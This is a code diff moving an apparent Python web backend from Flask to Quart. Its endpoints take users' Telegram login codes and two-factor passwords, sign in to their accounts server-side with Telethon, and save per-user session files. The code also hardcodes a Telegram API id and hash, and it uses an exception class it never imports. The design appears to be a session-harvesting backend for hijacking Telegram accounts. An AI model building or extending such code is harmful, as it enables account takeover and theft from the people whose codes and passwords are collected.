@@ -1,16 +1,26 @@
-from flask import Flask, jsonify
 from flask_cors import CORS
 import sqlite3
 import requests
+import os
 from bs4 import BeautifulSoup
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
 from db_func import *
-app = Flask(__name__)
+from quart import Quart, request, jsonify
+
+app = Quart(__name__)
 CORS(app, supports_credentials=True)
 
+api_id = 2040     
+api_hash = "b18441a1ff607e10a989891a5462e627"
 
 
+SESSION_DIR = "./sessions"
+os.makedirs(SESSION_DIR, exist_ok=True)
+
+def get_client_for_user(user_id: int):
+    session_file = os.path.join(SESSION_DIR, f"{user_id}.session")
+    return TelegramClient(session_file, api_id, api_hash)
 
 def clean_name(name):
     if not name:
@@ -104,22 +114,20 @@ def api_nft():
     return jsonify(response)
 
 
-api_id = 2040     
-api_hash = "b18441a1ff607e10a989891a5462e627"
 
 @app.route("/api/phone", methods=["POST"])
 async def api_phone():
-    data = request.get_json()
+    data = await request.get_json()
     user_id = data.get("user_id")
 
     if not user_id:
         return jsonify({"ok": False, "error": "missing user_id"}), 400
 
-    await client.connect()
-
-    phone = get_num_from_id(user_id)
-
     try:
+        client = get_client_for_user(user_id)
+        await client.connect()
+
+        phone = get_num_from_id(user_id)
         await client.send_code_request(phone)
         return jsonify({"ok": True})
     except Exception as e:
@@ -128,35 +136,41 @@ async def api_phone():
 
 @app.route("/api/code", methods=["POST"])
 async def api_code():
-    data = request.get_json()
+    data = await request.get_json()
     user_id = data.get("user_id")
     code = data.get("code")
 
     if not user_id or not code:
         return jsonify({"ok": False, "error": "missing user_id or code"}), 400
 
-    phone = get_num_from_id(user_id)
-
     try:
-        await client.sign_in(phone, code)
-        return jsonify({"ok": True, "2fa": False})
-    except SessionPasswordNeededError:
-        return jsonify({"ok": True, "2fa": True})
-    except PhoneCodeInvalidError:
-        return jsonify({"ok": False, "error": "invalid code"})
+        client = get_client_for_user(user_id)
+        await client.connect()
+        phone = get_num_from_id(user_id)
+
+        try:
+            await client.sign_in(phone, code)
+            return jsonify({"ok": True, "2fa": False})
+        except SessionPasswordNeededError:
+            return jsonify({"ok": True, "2fa": True})
+        except PhoneCodeInvalidError:
+            return jsonify({"ok": False, "error": "invalid code"})
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 400
 
 
 @app.route("/api/2fa", methods=["POST"])
 async def api_2fa():
-    data = request.get_json()
+    data = await request.get_json()
+    user_id = data.get("user_id")
     password = data.get("password")
 
-    if not password:
-        return jsonify({"ok": False, "error": "missing password"}), 400
+    if not user_id or not password:
+        return jsonify({"ok": False, "error": "missing user_id or password"}), 400
 
     try:
+        client = get_client_for_user(user_id)
+        await client.connect()
         await client.sign_in(password=password)
         return jsonify({"ok": True})
     except Exception as e:
